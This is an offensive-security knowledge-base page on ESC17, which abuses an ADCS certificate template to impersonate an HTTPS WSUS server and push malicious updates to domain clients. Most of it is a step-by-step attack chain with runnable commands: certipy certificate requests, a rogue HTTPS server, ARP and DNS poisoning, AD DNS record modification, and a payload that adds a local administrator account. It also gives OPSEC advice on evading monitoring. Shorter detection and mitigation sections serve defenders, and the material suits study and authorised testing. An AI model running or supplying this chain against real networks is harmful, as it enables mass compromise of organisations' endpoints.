---
title: "ESC17 — ADCS Certificate Spoofing to Attack HTTPS-Enabled WSUS Clients"
description: "ESC17 was coined by researchers Alexander Neff and Phil Knüfer at DigiTrace in January 2026. Unlike ESC1–ESC16 which target domain privilege escalation…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "adcs", "privilege-escalation", "lateral-movement"]
tools: ["NetExec", "Impacket", "Certipy", "Responder", "OpenSSL"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC17 — ADCS Certificate Spoofing to Attack HTTPS-Enabled WSUS Clients.md"
---
# ESC17 — ADCS Certificate Spoofing to Attack HTTPS-Enabled WSUS Clients

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Lateral Movement / Client Compromise |
| **Difficulty** | High |
| **Pre-requisites** | Template with Server Auth EKU + `ENROLLEE_SUPPLIES_SUBJECT` + WSUS deployed + MiTM capability |
| **Tools** | Certipy, PyWSUS, Responder, dnstool.py |
| **OPSEC Noise** | Medium-High — cert request + network-level MiTM |
| **One-liner** | Request CA-signed TLS cert for WSUS hostname via misconfigured template → MiTM WSUS traffic → serve malicious updates → SYSTEM on all clients. |

***

## What Is ESC17?

ESC17 was coined by researchers **Alexander Neff and Phil Knüfer** at DigiTrace in January 2026. Unlike ESC1–ESC16 which target **domain privilege escalation**, ESC17 targets **lateral movement and client compromise** by weaponising misconfigured ADCS templates to **impersonate a WSUS (Windows Server Update Services) server** — even when WSUS is secured with HTTPS.

The common belief was that enabling HTTPS on WSUS made it immune to spoofing and interception attacks. ESC17 shatters that assumption entirely. If an ADCS template permits low-privileged users to enroll and specify their own SAN, and that template has **Server Authentication EKU** — an attacker can request a **legitimate, CA-signed TLS certificate for the WSUS server's hostname**. With a trusted cert in hand they can MiTM the WSUS traffic, serve malicious updates, and achieve **SYSTEM-level code execution on every domain-joined client that polls that WSUS server**.

***

## ESC17 vs ESC1 — The Critical Distinction

ESC17 is essentially an **incomplete mitigation of ESC1**. Many organisations hardened ESC1 by removing `Client Authentication` EKU from permissive templates — but left `Server Authentication` EKU in place, not realising it opens a completely different attack surface:

| | ESC1 | ESC17 |
|---|---|---|
| **EKU abused** | `Client Authentication` (1.3.6.1.5.5.7.3.2) | **`Server Authentication` (1.3.6.1.5.5.7.3.1)** |
| **What you forge** | Identity as a domain user | **Identity as a server (e.g. WSUS)** |
| **Attack outcome** | Authenticate as Administrator → Domain Admin | **Impersonate WSUS → push malicious updates → SYSTEM on all clients** |
| **ESC1 mitigation blocks it?** | N/A | ❌ Removing Client Auth EKU does NOT fix it |
| **Requires HTTPS?** | N/A | ❌ Bypasses HTTPS entirely |
| **Target** | AD authentication | **Windows Update clients** |

***

## Required Conditions

| Condition | Notes |
|-----------|-------|
| Certificate template has **`Server Authentication` EKU** | OID `1.3.6.1.5.5.7.3.1` |
| Template has **`ENROLLEE_SUPPLIES_SUBJECT`** (SAN control) | Same flag as ESC1 — `Enrollee Supplies Subject: True` |
| Low-priv users can enroll | `Enrollment Rights: Domain Users` or similar |
| WSUS is deployed in the environment | Required target for the impersonation |
| Attacker can intercept or redirect WSUS traffic | ARP poisoning, DNS manipulation, BGP — any MiTM method |

> 💡 ESC17 can also be combined with **weak DNS ACL permissions** — if a low-priv user can also modify AD-integrated DNS records, they can redirect WSUS hostname resolution to their machine without needing any network-level MiTM. DNS ACL abuse + ESC17 is a particularly clean attack chain.

***

## Understanding the WSUS Attack Context

Before diving into the exploit chain, understand the target:

```
Normal WSUS flow:
  [Domain Client] ──── HTTPS ────► [WSUS Server wsus.domain.htb]
  Validates TLS cert of WSUS server
  Downloads + installs updates (runs as SYSTEM)

ESC17 abuse flow:
  [Attacker] requests cert for wsus.domain.htb via misconfigured template
  [Attacker box] presents valid TLS cert for wsus.domain.htb ← CA-signed
  [Domain Client] trusts the cert ← same CA they always trusted
  [Domain Client] ──── HTTPS ────► [Attacker box pretending to be WSUS]
  Receives malicious update package
  Executes as SYSTEM ← Game over
```

***

## Full Attack Chain

### Step 1 — Enumerate Vulnerable Templates

```bash
# Look for templates with Server Authentication EKU + Enrollee Supplies Subject
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# Manually grep if needed — Server Auth OID is 1.3.6.1.5.5.7.3.1
# Look for this pattern in certipy output:
# Extended Key Usage : Server Authentication   ← Target EKU
# Enrollee Supplies Subject : True             ← SAN control
# Enrollment Rights : DOMAIN\Domain Users      ← Low-priv enroll
```

### Step 2 — Identify the WSUS Server Hostname

```bash
# Query AD for WSUS server hostname via WUA (Windows Update Agent) settings
netexec ldap $TARGET -u 'lowpriv' -p 'Password123!' \
  -M get-desc-users

# Or check via registry (if you have a foothold on a client)
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer

# Typical output:
# WUServer = https://wsus.domain.htb:8531
```

### Step 3 — Request a Certificate for the WSUS Server Hostname

Use the `-dns` flag instead of `-upn` — because this is a Server Authentication cert, the identity is embedded as a DNS SAN, not a UPN:

```bash
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'VulnServerAuthTemplate' \
  -dns 'wsus.domain.htb'

# Output: wsus.pfx
# Certificate contains DNS SAN = wsus.domain.htb
# Signed by the domain CA — clients will trust it
```

### Step 4 — Set Up a Rogue WSUS Server

```bash
# Use PWSHark or a custom HTTPS server with your cert
# The simplest approach — Python HTTPS server with the cert

openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes
# Split into cert.pem and key.pem then:

python3 -c "
import ssl, http.server
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain('wsus.pem')
httpd = http.server.HTTPServer(('0.0.0.0', 8531), http.server.BaseHTTPRequestHandler)
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
"

# More practically — use PyWSUS or a dedicated WSUS spoofing tool
# to serve malicious Windows Update packages
```

### Step 5 — Redirect WSUS Traffic to Your Box

**Option A — ARP Poisoning (LAN access):**
```bash
arpspoof -i eth0 -t <CLIENT-IP> <WSUS-IP>
arpspoof -i eth0 -t <WSUS-IP> <CLIENT-IP>
```

**Option B — DNS Record Manipulation (if you have DNS write ACLs):**
```bash
# If you have WriteProperty on the DNS zone (common misconfiguration)
# Update the WSUS A record to point to your IP
impacket-adidnsdump -u 'domain.htb\lowpriv' -p 'Password123!' $TARGET
# Then modify the WSUS record with dnstool.py or adidnsdump
python3 dnstool.py \
  -u 'domain.htb\lowpriv' \
  -p 'Password123!' \
  --action modify \
  --record wsus \
  --data <YOUR-IP> \
  $TARGET
```

**Option C — Responder DNS poisoning (if clients query via broadcast):**
```bash
responder -I eth0 -A  # Analyse mode first to see queries
responder -I eth0     # Then active to poison
```

### Step 6 — Serve Malicious Update and Get SYSTEM

```bash
# When a client polls your rogue WSUS server over HTTPS with your
# legitimate CA-signed cert, it accepts the connection and downloads
# whatever update package you serve.
# Windows Update runs packages as SYSTEM.

# Using PyWSUS for update spoofing:
# https://github.com/GoSecure/pywsus
python3 wsus-inject.py \
  --host 0.0.0.0 \
  --port 8531 \
  --cert wsus.pem \
  --payload 'cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add'

# Every domain-joined client polling this WSUS = SYSTEM shell
```

***

## ESC17 + Weak DNS ACLs — The Clean Chain

The most powerful ESC17 scenario discovered by Mustafa Durukan combines ESC17 with DNS ACL abuse:

```
[lowpriv@domain.htb]
        │
        ├── WriteProperty on DNS Zone object (common misconfiguration)
        │   Modify WSUS A record → point to YOUR-IP
        │
        └── Enroll in Server Auth + Enrollee Supplies Subject template
            Request cert for wsus.domain.htb
            Serve rogue WSUS over HTTPS with valid cert
                    │
                    ▼
        [All WSUS clients redirected + TLS trusted]
                    │
                    ▼
        [Malicious update pushed → SYSTEM on every client]
```

No ARP spoofing. No network-level MiTM. Just two AD misconfigurations chained together.

***

## ESC17 Real-World Significance

In my opinion, ESC17 is one of the more impactful recent ADCS discoveries precisely because it **exploits defensive blind spots**. Defenders who specifically hardened ESC1 by removing `Client Authentication` EKU may have created a false sense of security — leaving `Server Authentication` wide open. It also targets **client machines at scale** rather than just domain admins, meaning a successful ESC17 attack could compromise every endpoint in the organisation simultaneously.

***

## Detection Indicators

- **Event ID 4887** — Certificate issued with a DNS SAN matching an internal server hostname (e.g. `wsus.domain.htb`) where the requester is a low-priv user account
- **DNS audit logs** — Unexpected modification of WSUS or critical server DNS records
- **WSUS client logs** — Clients connecting to a WSUS IP that doesn't match the known WSUS server IP
- **Certificate Transparency monitoring** — Any cert issued for internal hostnames like `wsus.domain.htb` should alert immediately
- **Network IDS** — HTTPS connections to WSUS port (8530/8531) from non-WSUS IPs

***

## Mitigation

- **Remove `Server Authentication` EKU** from any template that also has `ENROLLEE_SUPPLIES_SUBJECT` — this is the direct fix
- **Restrict enrollment rights** — templates with Server Auth EKU should never be enrollable by `Domain Users`
- **Pin WSUS server certificate** via Group Policy — configure clients to only trust a specific certificate thumbprint for WSUS connections
- **Audit DNS ACLs** — remove unnecessary `WriteProperty` permissions from AD-integrated DNS zones
- **WSUS over HTTPS alone is not sufficient** — implement certificate pinning OR restrict which certificates clients accept for WSUS communication
- **Run `certipy find -vulnerable`** and specifically look for templates with `Server Authentication` EKU + `Enrollee Supplies Subject: True` — this combination is ESC17

***

## OPSEC Considerations

| Action | Event Generated | Noise Level |
|--------|----------------|-------------|
| Certificate request with DNS SAN | Event ID 4887 on CA | 🟡 Medium |
| ARP poisoning for MiTM | Network IDS alerts | 🔴 High |
| DNS record modification | DNS audit logs | 🟡 Medium |
| Rogue WSUS server operation | Client WSUS logs, network anomalies | 🔴 High |
| Malicious update execution | Sysmon, EDR process creation | 🔴 High |

> ⚠️ ESC17 is a **high-noise** attack due to the network-level MiTM component. The DNS manipulation variant is cleaner but still generates audit logs. Best suited for environments with limited network monitoring.

***

## References

- [Using ADCS to Attack HTTPS-Enabled WSUS Clients — DigiTrace](https://blog.digitrace.de/2026/01/using-adcs-to-attack-https-enabled-wsus-clients/)
- [ADCS Misconfig & Weak DNS ACLs Compromise WSUS Clients — Mustafa Durukan](https://www.linkedin.com/posts/mustafa-durukan_esc17-from-adcs-misconfiguration-to-wsus-activity-7432130640709357568-d9CE)
- [AD CS Security: Understanding and Exploiting ESC Techniques — Vaadata](https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/)
- [Active Directory Certificate ESC Attacks — InternalAllTheThings](/internal/active-directory/ad-adcs-esc)
